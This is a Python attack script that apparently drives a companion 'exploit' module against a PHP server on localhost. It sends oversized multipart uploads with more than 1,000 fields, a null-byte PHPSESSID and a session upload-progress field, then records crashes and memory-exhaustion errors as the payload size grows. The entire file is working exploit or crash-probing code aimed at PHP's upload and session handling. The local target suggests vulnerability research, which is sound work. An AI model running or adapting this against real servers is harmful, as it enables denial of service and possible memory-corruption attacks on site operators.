import os
import sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, build_multipart

port = sys.argv[1] if len(sys.argv) > 1 else "18101"
t = Target(f"http://127.0.0.1:{port}/index.php", timeout=120, verbose=False)

def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def rotate():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * (12 * 1024 * 1024)}]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.5)

for mb in [2, 4, 6, 8, 10, 12, 16]:
    rotate()
    big = mb * 1024 * 1024
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * big}]
    try:
        r = t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    except Exception as e:
        print(f"big={mb}MB: EXC {e}")
        continue
    oom = b"Allowed memory size" in r
    status = "CRASH(0B)" if len(r) == 0 else ("OOM" if oom else f"ok({len(r)}B)")
    print(f"big={mb:2d}MB: {status}", flush=True)
    time.sleep(0.5)
